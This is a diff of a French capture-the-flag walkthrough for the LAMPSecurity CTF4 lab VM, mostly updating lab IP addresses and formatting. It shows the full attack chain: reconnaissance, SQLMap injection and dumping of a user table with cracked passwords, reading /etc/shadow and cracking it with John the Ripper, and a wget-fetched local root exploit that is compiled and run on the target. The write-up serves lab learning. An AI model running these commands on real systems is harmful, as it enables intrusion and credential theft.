@@ -7,56 +7,52 @@ Lecture recommandée : [Walkthrough sur le challenge LAMPSecurity: CTF5](/CTF-Vu
 
 ## Recherche d'informations
 
-Comme pour le challenge CTF5, [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF4.
+Comme pour le challenge CTF5, [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM LAMPSecurity CTF4.
 
 ```console
-root@blinils:~# netdiscover -r 192.168.56.0/24
+root@blinils:~# ifconfig | grep broadcast
+        inet 192.168.15.130  netmask 255.255.255.0  broadcast 192.168.15.255
 
- Currently scanning: Finished!   |   Screen View: Unique Hosts                                
-                                                                                              
- 6 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 360                              
- _____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
- -----------------------------------------------------------------------------
- 192.168.56.1    01:02:03:04:05:06      1      60  Unknown vendor                             
- 192.168.56.102  08:00:80:00:80:00      1      60  PCS Systemtechnik GmbH                     
- 192.168.56.103  06:00:06:00:06:00      1      60  PCS Systemtechnik GmbH                     
- 192.168.56.103  00:06:00:06:00:06      1      60  VMware, Inc.                               
- 192.168.56.104  07:00:07:00:07:00      1      60  PCS Systemtechnik GmbH                     
- 192.168.56.104  00:07:00:07:00:07      1      60  VMware, Inc.
+root@blinils:~# netdiscover -r 192.168.15.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.15.1    00:50:56:c0:00:01      1      60  VMware, Inc.
+192.168.15.131  00:0c:29:28:a6:ad      1      60  VMware, Inc.
+192.168.15.254  00:50:56:50:56:50      1      60  VMware, Inc.
 ```
 
-192.168.56.102 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), tandis que 192.168.56.104 correspond à l'adresse IP de la VM LAMPSecurity CTF4. À présent, c'est au tour de l'outil [nmap](https://nmap.org/book/man.html) d'être lancé afin de détecter les ports ouverts sur le serveur CTF4, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.
+192.168.15.130 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), tandis que 192.168.15.131 correspond à l'adresse IP de la VM LAMPSecurity CTF4. À présent, c'est au tour de l'outil [__nmap__](https://nmap.org/book/man.html) d'être lancé afin de détecter les ports ouverts sur le serveur CTF4, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.
 
 ```console
-root@blinils:~# nmap -sT -sV -A 192.168.56.104
+root@blinils:~# nmap -sT -sV 192.168.15.131 --script=http-enum
 
-Host is up (0.018s latency).
+Nmap scan report for 192.168.15.131
+Host is up (0.031s latency).
 Not shown: 996 filtered ports
 PORT    STATE  SERVICE VERSION
 22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
-|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
 25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
-| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.56.102], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
-|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
 80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
-| http-robots.txt: 5 disallowed entries 
-|_/mail/ /restricted/ /conf/ /sql/ /admin/
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/index.php: Possible admin folder
+|   /admin/login.php: Possible admin folder
+|   /admin/admin.php: Possible admin folder
+|   /robots.txt: Robots file
+|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
+|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
+|   /pages/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
+|   /restricted/: Potentially interesting folder (401 Authorization Required)
+|   /sql/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
+|_  /usage/: Potentially interesting folder
 |_http-server-header: Apache/2.2.0 (Fedora)
-|_http-title:  Prof. Ehks 
 631/tcp closed ipp
-MAC Address: 07:00:07:00:07:00 (Oracle VirtualBox virtual NIC)
---snip--
-Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), SonicWALL Aventail EX-6000 VPN appliance (95%), Control4 HC-300 home controller (95%), Lantronix SLC 8 terminal server (Linux 2.6) (95%), SNR SNR-S2960 switch (95%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.9 - 2.6.18 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), Linux 2.6.18 - 2.6.32 (94%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 1 hop
-Service Info: Host: ctf4.sas.upenn.edu; OS: Unix
-
-TRACEROUTE
-HOP RTT      ADDRESS
-1   17.93 ms 192.168.56.104
+MAC Address: 00:0C:29:28:A6:AD (VMware)
 ```
 
 Toutes ces informations glanées en quelques minutes vont permettre à une personne malveillante de peaufiner ses attaques à venir : ainsi, il est possible de [se connecter à distance avec SSH](https://en.wikipedia.org/wiki/Secure_Shell) au serveur LAMPSecurity CTF4 (port 22), un serveur Web Apache 2.2.0 (port 80) et un serveur de messagerie électronique (ports 25) y sont installés. Pour chacun de ces services, il est désormais temps de partir à la chasse aux vulnérabilités.
@@ -66,25 +62,25 @@ Toutes ces informations glanées en quelques minutes vont permettre à une perso
 Le serveur Web semble a priori le plus alléchant pour commencer ; il y a tellement de pages,
 de pistes intéressantes à creuser que l'on ne sait plus où donner de la tête. Entre autres...
 
-* _/index.html_ qui affiche des informations en fonction du paramètre _page_ : blog, research, contact...
-* _/index.html?page=blog_ cinq billets de blog signés jdurbin et sorzek, potentiellement des noms d'utilisateur pour de futurs accès en SSH ?
-* _/index.html?page=research_ un long laïus Lorem Ipsum... une légende ancestrale raconte que le mot de passe root y serait dissimulé
-* _/index.html?page=search&title=keyword_ un formulaire de recherche sur le site
-* _/mail_ un formulaire d'authentification au webmail SquirrelMail version 1.4.17
-* _/restricted_ un répertoire protégé par mot de passe, très certainement à l'aide d'un .htaccess
-* _/conf_ qui renvoie systématiquement une _Internal Server Error_ mais on y apprend qu'un dénommé dstevens est administrateur
-* _/sql_ un répertoire en libre accès qui contient un unique fichier, db.sql
-* _/admin_ un formulaire d'authentification
-* _/usage_ des statistiques issues du logiciel Webalizer : nombre de hits et de visites, pays d'origine des visiteurs...
+* ```/index.html``` qui affiche des informations en fonction du paramètre ```page``` : blog, research, contact...
+* ```/index.html?page=blog``` cinq billets de blog signés jdurbin et sorzek, potentiellement des noms d'utilisateur pour de futurs accès en SSH ?
+* ```/index.html?page=research``` un long laïus Lorem Ipsum... une légende ancestrale raconte que le mot de passe root y serait dissimulé
+* ```/index.html?page=search&title=keyword``` un formulaire de recherche sur le site
+* ```/mail``` un formulaire d'authentification au webmail SquirrelMail version 1.4.17
+* ```/restricted``` un répertoire protégé par mot de passe, très certainement à l'aide d'un .htaccess
+* ```/conf``` qui renvoie systématiquement une _Internal Server Error_ mais on y apprend qu'un dénommé dstevens est administrateur
+* ```/sql``` un répertoire en libre accès qui contient un unique fichier, ```db.sql```
+* ```/admin``` un formulaire d'authentification
+* ```/usage``` des statistiques issues du logiciel Webalizer : nombre de hits et de visites, pays d'origine des visiteurs...
 
-Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [nikto](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.
+Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [__nikto__](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.
 
 ```console
-root@blinils:~# nikto -h http://192.168.56.104
+root@blinils:~# nikto -h http://192.168.15.131
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
-+ Target IP:          192.168.56.104
-+ Target Hostname:    192.168.56.104
++ Target IP:          192.168.15.131
++ Target Hostname:    192.168.15.131
 + Target Port:        80
 + Start Time:         2018-01-01 12:34:54 (GMT1)
 ---------------------------------------------------------------------------
@@ -139,9 +135,9 @@ Outre les logins habituels root, bin, daemon, apache, mysql... six utilisateurs 
 
 ### db.sql
 
-Un fichier SQL est accessible sans authentification à l'adresse suivante : http://192.168.56.104/sql/db.sql
+Un fichier SQL est accessible sans authentification à l'adresse suivante : ```http://192.168.15.131/sql/db.sql```
 
-Il s'agit du script de création de la base de données « ehks », avec trois tables : user, blog et comment.
+Il s'agit du script de création de la base de données ```ehks``` avec trois tables : ```user```, ```blog``` et ```comment```.
 
 Ces informations seront très utiles si une injection SQL venait à être trouvée sur le site... _you don't say?_
 
@@ -154,15 +150,14 @@ create table comment (comment_id int not null auto_increment primary key, commen
 
 ### Injection SQL et dump de la base de données
 
-L'insertion d'une seule apostrophe suffit à démontrer la présence d'une [injection SQL](https://www.owasp.org/index.php/SQL_Injection), a minima sur le champ _id_.
+L'insertion d'une seule apostrophe suffit à démontrer la présence d'une [injection SQL](https://www.owasp.org/index.php/SQL_Injection), a minima sur le champ ```id```.
 
 ![Affichage de l'image CTF4_SQLi1.png](images/CTF4_SQLi1.png)
 
-Afin d'éviter de longs tests manuels fastidieux, pour trouver la bonne syntaxe permettant d'exfiltrer les données de la base MySQL, SQLMap vient à la rescousse. Il s'agit [d'un outil open source permettant d'identifier et d'exploiter une injection SQL](https://connect.ed-diamond.com/MISC/MISC-062/Utilisation-avancee-de-sqlmap) sur des applications Web. En lui spécifiant l'URL du site Web ainsi que les paramètres à tester, SQLMap va tester différentes techniques afin d'identifier la présence d'une injection SQL...
+Afin d'éviter de longs tests manuels fastidieux, pour trouver la bonne syntaxe permettant d'exfiltrer les données de la base MySQL, __SQLMap__ vient à la rescousse. Il s'agit [d'un outil open source permettant d'identifier et d'exploiter une injection SQL](https://connect.ed-diamond.com/MISC/MISC-062/Utilisation-avancee-de-sqlmap) sur des applications Web. En lui spécifiant l'URL du site Web ainsi que les paramètres à tester, SQLMap va tester différentes techniques afin d'identifier la présence d'une injection SQL...
 
 ```console
-
-root@blinils:~# sqlmap -u "http://192.168.56.104/index.html?page=blog&title=Blog&id=2"
+root@blinils:~# sqlmap -u "http://192.168.15.131/index.html?page=blog&title=Blog&id=2"
 
 --snip--
 [12:35:46] [INFO] testing connection to the target URL
@@ -198,14 +193,12 @@ back-end DBMS: MySQL >= 5.0.12
 [12:35:46] [ERROR] user quit
 ```
 
-En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le troisième paramètre testé _id_ est vulnérable aux injections SQL. Après plusieurs tentatives, SQLMap récupère les tables (--tables) ainsi que les colonnes (--columns) présentes dans chaque base de données trouvée (--dbs), et tant qu'à faire, autant récupérer tout le contenu de la base de données (--dump-all).
+En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le troisième paramètre testé ```id``` est vulnérable aux injections SQL. Après plusieurs tentatives, SQLMap récupère les tables ```--tables``` ainsi que les colonnes ```--columns``` présentes dans chaque base de données trouvée ```--dbs```, et tant qu'à faire, autant récupérer tout le contenu de la base de données avec ```--dump-all```.
 
 ```console
-root@blinils:~# sqlmap -u "http://192.168.56.104/index.html?page=blog&title=Blog&id=2" --dbms=MySQL --dbs -v0
+root@blinils:~# sqlmap -u "http://192.168.15.131/index.html?page=blog&title=Blog&id=2" --dbms=MySQL --dbs -v0
 
 --snip--
-
----
 web server operating system: Linux Fedora 5 (Bordeaux)
 web application technology: Apache 2.2.0, PHP 5.1.2
 back-end DBMS: MySQL >= 5.0.0
@@ -215,16 +208,14 @@ available databases [5]:
 [*] mysql
 [*] roundcubemail
 [*] test
----
+--snip--
 ```
 
-La table ehks était déjà connue grâce au fichier db.sql trouvé auparavant. C'est parti pour le dump des données !
+La table ehks était déjà connue grâce au fichier ```db.sql``` trouvé auparavant. C'est parti pour le dump des données !
 
 ```console
-root@blinils:~# sqlmap -u "http://192.168.56.104/index.html?page=blog&title=Blog&id=2" --dbms=MySQL -D ehks --tables
-
+root@blinils:~# sqlmap -u "http://192.168.15.131/index.html?page=blog&title=Blog&id=2" --dbms=MySQL -D ehks --tables
 --snip--
-
 [22:34:56] [INFO] fetching tables for database: 'ehks'
 Database: ehks
 [3 tables]
@@ -233,13 +224,10 @@ Database: ehks
 | blog    |
 | comment |
 +---------+
-
 --snip--
 
-root@blinils:~# sqlmap -u "http://192.168.56.104/index.html?page=blog&title=Blog&id=2" --dbms=MySQL --dump -D ehks -T user
-
+root@blinils:~# sqlmap -u "http://192.168.15.131/index.html?page=blog&title=Blog&id=2" --dbms=MySQL --dump -D ehks -T user
 --snip--
-
 [12:13:14] [INFO] fetching columns for table 'user' in database 'ehks'
 [12:13:14] [INFO] fetching entries for table 'user' in database 'ehks'
 [12:13:14] [INFO] recognized possible password hashes in column 'user_pass'
@@ -256,13 +244,13 @@ what dictionary do you want to use?
 do you want to use common password suffixes? (slow!) [y/N] y
 [12:13:14] [INFO] starting dictionary-based cracking (md5_generic_passwd)
 [12:13:14] [WARNING] multiprocessing hash cracking is currently not supported on this platform
-[12:13:14] [INFO] cracked password 'convertible' for user 'sorzek'                                                                                 
-[12:13:14] [INFO] cracked password 'Homesite' for user 'pmoore'                                                                                    
-[12:13:14] [INFO] cracked password 'ilike2surf' for user 'dstevens'                                                                                
-[12:13:14] [INFO] cracked password 'seventysixers' for user 'achen'                                                                                
-[12:13:14] [INFO] cracked password 'Sue1978' for user 'jdurbin'                                                                                    
-[12:13:14] [INFO] cracked password 'undone1' for user 'ghighland'                                                                                  
-Database: ehks                                                                                                                                     
+[12:13:14] [INFO] cracked password 'convertible' for user 'sorzek'
+[12:13:14] [INFO] cracked password 'Homesite' for user 'pmoore'
+[12:13:14] [INFO] cracked password 'ilike2surf' for user 'dstevens'
+[12:13:14] [INFO] cracked password 'seventysixers' for user 'achen'
+[12:13:14] [INFO] cracked password 'Sue1978' for user 'jdurbin'
+[12:13:14] [INFO] cracked password 'undone1' for user 'ghighland'
+Database: ehks
 Table: user
 [6 entries]
 +---------+-----------+--------------------------------------------------+
@@ -277,20 +265,20 @@ Table: user
 +---------+-----------+--------------------------------------------------+
 ```
 
-[L'attaque par dictionnaire sur les hashs de mots de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) trouvés par SQLMap a porté ses fruits : six mots de passe ont ainsi pu être récupérés. La découverte de ces mots de passe permet à un attaquant de se connecter sur le webmail SquirrelMail /mail/ en tant que dstevens, achen, pmoore, jdurbin ou encore ghighland... mais pas sorzek.
+[L'attaque par dictionnaire sur les hashs de mots de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) trouvés par SQLMap a porté ses fruits : six mots de passe ont ainsi pu être récupérés. La découverte de ces mots de passe permet à un attaquant de se connecter sur le webmail SquirrelMail ```/mail/``` en tant que ```dstevens```, ```achen```, ```pmoore```, ```jdurbin``` ou encore ```ghighland```... mais pas ```sorzek``` !
 
 ### Accès SSH et élévation de privilèges, partie 1
 
-Inutile de lancer une attaque par dictionnaire avec Hydra, les mots de passe trouvés dans la base de données semblent fonctionner partout !
+Inutile de lancer une attaque par dictionnaire avec [__Hydra__](http://sectools.org/tool/hydra/), les mots de passe trouvés dans la base de données semblent fonctionner partout !
 
 ```console
-root@blinils:~# ssh dstevens@192.168.56.104
-The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
+root@blinils:~# ssh dstevens@192.168.15.131
+The authenticity of host '192.168.15.131 (192.168.15.131)' can't be established.
 RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.
 Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '192.168.56.104' (RSA) to the list of known hosts.
+Warning: Permanently added '192.168.15.131' (RSA) to the list of known hosts.
 BSD SSH 4.1
-dstevens@192.168.56.104's password: 
+dstevens@192.168.15.131's password: 
 Last login: Mon Mar  9 07:48:18 2009 from 192.168.0.50
 
 [dstevens@ctf4 ~]$ sudo -l
@@ -326,7 +314,7 @@ jdurbin:DPdoXSwmSWpYo
 sorzek:z/a8PtVaqxwWg 
 ```
 
-Le répertoire _restricted_ ne le sera plus, dès lors que John The Ripper n'aura fait qu'une bouchée de ces mots de passe.
+Le répertoire ```restricted``` ne le sera plus, dès lors que [__John The Ripper__](https://www.openwall.com/john/) n'aura fait qu'une bouchée de ces mots de passe.
 
 ```console
 root@blinils:~# john .htpasswd --wordlist=/usr/share/dict/rockyou.txt
@@ -340,9 +328,7 @@ Homesite         (pmoore)
 
 ### Attaque par dictionnaire avec John The Ripper sur le fichier /etc/shadow
 
-Le fichier /etc/shadow est particulièrement intéressant, car
-[il contient les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
-L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers /etc/passwd et /etc/shadow, comme suit...
+Le fichier ```/etc/shadow``` est particulièrement intéressant, car [il contient les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes. L'outil [__John The Ripper__](https://www.openwall.com/john/) est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers ```/etc/passwd``` et ```/etc/shadow```, comme suit...
 
 ```console
 [root@ctf4 ~]# cat /etc/shadow
@@ -351,38 +337,7 @@ bin:*:14309:0:99999:7:::
 daemon:*:14309:0:99999:7:::
 adm:*:14309:0:99999:7:::
 lp:*:14309:0:99999:7:::
-sync:*:14309:0:99999:7:::
-shutdown:*:14309:0:99999:7:::
-halt:*:14309:0:99999:7:::
-mail:*:14309:0:99999:7:::
-news:*:14309:0:99999:7:::
-uucp:*:14309:0:99999:7:::
-operator:*:14309:0:99999:7:::
-games:*:14309:0:99999:7:::
-gopher:*:14309:0:99999:7:::
-ftp:*:14309:0:99999:7:::
-nobody:*:14309:0:99999:7:::
-dbus:!!:14309:0:99999:7:::
-rpm:!!:14309:0:99999:7:::
-apache:!!:14309:0:99999:7:::
-distcache:!!:14309:0:99999:7:::
-ntp:!!:14309:0:99999:7:::
-nscd:!!:14309:0:99999:7:::
-vcsa:!!:14309:0:99999:7:::
-webalizer:!!:14309:0:99999:7:::
-dovecot:!!:14309:0:99999:7:::
-mysql:!!:14309:0:99999:7:::
-netdump:!!:14309:0:99999:7:::
-pcap:!!:14309:0:99999:7:::
-avahi:!!:14309:0:99999:7:::
-named:!!:14309:0:99999:7:::
-mailnull:!!:14309:0:99999:7:::
-smmsp:!!:14309:0:99999:7:::
-haldaemon:!!:14309:0:99999:7:::
-rpc:!!:14309:0:99999:7:::
-xfs:!!:14309:0:99999:7:::
-gdm:!!:14309:0:99999:7:::
-rpcuser:!!:14309:0:99999:7:::
+--snip--
 nfsnobody:!!:14309:0:99999:7:::
 sshd:!!:14309:0:99999:7:::
 dstevens:$1$fU8HOHqa$N542xtl0ft8NmsYkv5NFo/:14309:0:99999:7:::
@@ -394,10 +349,9 @@ ghighland:$1$ooKvtZEY$N2RpSaIylgFlHnBkbwUGz0:14309:0:99999:7:::
 ossec:!!:14312:0:99999:7:::
 ossecm:!!:14312:0:99999:7:::
 ossecr:!!:14312:0:99999:7:::
-[root@localhost ~]#
 ```
 
-Un troisième dictionnaire est appelé à la rescousse : Rockyou.
+Un troisième dictionnaire est appelé à la rescousse : [rockyou.txt](https://wiki.skullsecurity.org/Passwords).
 
 ```console
 root@blinils:~# unshadow passwdCTF4.txt shadowCTF4.txt > passwd.db
@@ -431,9 +385,9 @@ ghighland:undone1:505:505:Greg Highland:/home/ghighland:/bin/bash
 Au tour d'Andrew Chen !
 
 ```console
-root@blinils:~# ssh achen@192.168.56.104
+root@blinils:~# ssh achen@192.168.15.131
 BSD SSH 4.1
-achen@192.168.56.104's password: 
+achen@192.168.15.131's password: 
 Last login: Mon Mar  9 16:10:36 2009 from 192.168.0.51
 [achen@ctf4 ~]$ head -n10 .bash_history
 exit
@@ -449,7 +403,7 @@ su
 [achen@ctf4 ~]$ 
 ```
 
-Tiens donc, ne serait-ce pas le mot de passe de l'administrateur root dans le fichier .bash_history ?
+Tiens donc, ne serait-ce pas le mot de passe de l'administrateur root dans le fichier ```.bash_history``` ?
 
 ```console
 [achen@ctf4 ~]$ sudo -l
@@ -465,9 +419,9 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 De toute façon, Andrew a tous les droits et peut passer root sans mot de passe. Au tour de Sally Orzek !
 
 ```console
-root@blinils:~# ssh sorzek@192.168.56.104
+root@blinils:~# ssh sorzek@192.168.15.131
 BSD SSH 4.1
-sorzek@192.168.56.104's password: 
+sorzek@192.168.15.131's password: 
 Last login: Thu Dec  1 15:25:25 2016 from 192.168.56.1
 
 [sorzek@ctf4 ~]$ cat .bash_history
@@ -495,7 +449,7 @@ su
 
 Intéressant comme comportement.
 
-Sally a consulté un fichier config.ini avant de se connecter à la base de données. Voyons voir ce que contient ce fichier.
+Sally a consulté un fichier ```config.ini``` avant de se connecter à la base de données. Voyons voir ce que contient ce fichier.
 
 ```console
 [sorzek@ctf4 ~]$ cd /var/www/html
@@ -538,20 +492,7 @@ mysql> select table_schema, table_name from information_schema.tables;
 +--------------------+---------------------------------------+
 | table_schema       | table_name                            |
 +--------------------+---------------------------------------+
-| information_schema | CHARACTER_SETS                        |
-| information_schema | COLLATIONS                            |
-| information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |
-| information_schema | COLUMNS                               |
-| information_schema | COLUMN_PRIVILEGES                     |
-| information_schema | KEY_COLUMN_USAGE                      |
-| information_schema | ROUTINES                              |
-| information_schema | SCHEMATA                              |
-| information_schema | SCHEMA_PRIVILEGES                     |
-| information_schema | STATISTICS                            |
-| information_schema | TABLES                                |
-| information_schema | TABLE_CONSTRAINTS                     |
-| information_schema | TABLE_PRIVILEGES                      |
-| information_schema | TRIGGERS                              |
+--snip--
 | information_schema | VIEWS                                 |
 | information_schema | USER_PRIVILEGES                       |
 | ehks               | blog                                  |
@@ -559,19 +500,7 @@ mysql> select table_schema, table_name from information_schema.tables;
 | ehks               | user                                  |
 | mysql              | columns_priv                          |
 | mysql              | db                                    |
-| mysql              | func                                  |
-| mysql              | help_category                         |
-| mysql              | help_keyword                          |
-| mysql              | help_relation                         |
-| mysql              | help_topic                            |
-| mysql              | host                                  |
-| mysql              | proc                                  |
-| mysql              | procs_priv                            |
-| mysql              | tables_priv                           |
-| mysql              | time_zone                             |
-| mysql              | time_zone_leap_second                 |
-| mysql              | time_zone_name                        |
-| mysql              | time_zone_transition                  |
+--snip--
 | mysql              | time_zone_transition_type             |
 | mysql              | user                                  |
 | roundcubemail      | cache                                 |
@@ -607,10 +536,9 @@ mysql> select Host, User, Password from mysql.user;
 | localhost          | roundcube | 5d2e19393cc5ef67 |
 +--------------------+-----------+------------------+
 5 rows in set (0.00 sec)
-
 ```
 
-Les mots de passe stockés dans la table ehks.users permettent de se connecter un peu partout (SSH, SquirrelMail...) sur le serveur.
+Les mots de passe stockés dans la table ```ehks.users``` permettent de se connecter un peu partout (SSH, SquirrelMail...) sur le serveur.
 
 ```console
 https://crackstation.net/
@@ -626,11 +554,11 @@ e0a23947029316880c29e8533d8662a3 md5 convertible
 
 Une _Cross-Site Scripting_, abrégée XSS, est l'une des failles de sécurité les plus répandues dans les applications Web. Elle peut être utilisée par un attaquant pour provoquer un comportement du site Web différent de celui désiré par le créateur de la page. Cette vulnérabilité est due à une validation incorrecte, côté serveur, des entrées provenant de l'utilisateur. Lors de l'accès à certaines pages du site Web, des paramètres HTTP (en-têtes, GET, POST) ou des éléments entrés par l'utilisateur sont réécrits directement dans la réponse du serveur, sans avoir été correctement validés, filtrés, nettoyés côté serveur. Un attaquant pourra alors injecter du code malveillant au lieu de données légitimes.
 
-Ici avec le paramètre _title_ de la page index.html...
+Ici avec le paramètre ```title``` de la page ```index.html```...
 
 ![Affichage de l'image CTF4_XSS1.png](images/CTF4_XSS1.png)
 
-Ou encore le paramètre _searchterm_ sous forme de mot-clé envoyé en HTTP POST au serveur.
+Ou encore le paramètre ```searchterm``` sous forme de mot-clé envoyé en HTTP POST au serveur.
 
 ![Affichage de l'image CTF4_XSS1.png](images/CTF4_XSS2.png)
 
@@ -641,7 +569,7 @@ En remplaçant ici les paramètres par du code Javascript, celui-ci sera réécr
 ![Affichage de l'image CTF4_SQLi2.png](images/CTF4_SQLi2.png)
 
 ```console
-root@blinils:~# sqlmap -u "http://192.168.56.104/admin/index.php" --data="username=test&password=abc" --dbms=MySQL
+root@blinils:~# sqlmap -u "http://192.168.15.131/admin/index.php" --data="username=test&password=abc" --dbms=MySQL
 
 --snip--
 [01:11:11] [INFO] testing connection to the target URL
@@ -738,9 +666,7 @@ Sr. Unix Admin
 Prof. Ehks Data Research Center
 ```
 
-Troisième mail : pour mettre en place [la sonde HIDS](https://fr.wikipedia.org/wiki/Syst%C3%A8me_de_d%C3%A9tection_d%27intrusion) [OSSEC](https://ossec.github.io/),
-Andrew Chen a également dû installer [gcc](https://gcc.gnu.org/) et [binutils](https://www.gnu.org/software/binutils/). Un compilateur est donc installé sur le serveur,
-c'est parfait !
+Troisième mail : pour mettre en place [la sonde HIDS](https://fr.wikipedia.org/wiki/Syst%C3%A8me_de_d%C3%A9tection_d%27intrusion) [OSSEC](https://ossec.github.io/), Andrew Chen a également dû installer [gcc](https://gcc.gnu.org/) et [binutils](https://www.gnu.org/software/binutils/). Un compilateur est donc installé sur le serveur, c'est parfait !
 
 ```
 Date: Mon, 9 Mar 2009 11:47:41 -0400 (EDT)
@@ -757,9 +683,9 @@ Unix Administrator
 Ehks Data Research Center
 ```
 
-### Bonus n°4 : Utilisation d'un _Local Root Exploit_
+### Bonus n°4 : Utilisation de l'exploit 'sock_sendpage()' Ring0 Privilege Escalation
 
-Hop, un petit serveur Web pour mettre à disposition de la VM LampSecurity [cet exploit](https://www.exploit-db.com/exploits/9479/) disponible également sur Kali.
+Hop, un petit serveur Web pour mettre à disposition de la VM LAMPSecurity [cet exploit](https://www.exploit-db.com/exploits/9479/) intitulé _'sock_sendpage()' Ring0 Privilege Escalation_, disponible également sur Kali. Pendant ce temps, le _local root exploit_ est compilé avec gcc puis exécuté, et tadaaam... root !
 
 ```console
 root@blinils:~# cp /usr/share/exploitdb/exploits/linux/local/9479.c 9479.c
@@ -767,12 +693,10 @@ root@blinils:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-Pendant ce temps, l'exploit est compilé avec gcc puis exécuté, et tadaaam... root !
-
-Une conclusion idéale pour ce _walkthrough_ sur le quatrième épisode de la saga LampSecurity.
+Une conclusion idéale pour ce _walkthrough_ sur le quatrième épisode de la saga LAMPSecurity.
 
 ```console
-[sorzek@ctf4 ~]$ wget http://192.168.56.102:8000/9479.c -q
+[sorzek@ctf4 ~]$ wget http://192.168.15.130:8000/9479.c -q
 [sorzek@ctf4 ~]$ gcc 9479.c -o 9479
 9479.c:130:28: warning: no newline at end of file
 [sorzek@ctf4 ~]$ ./9479
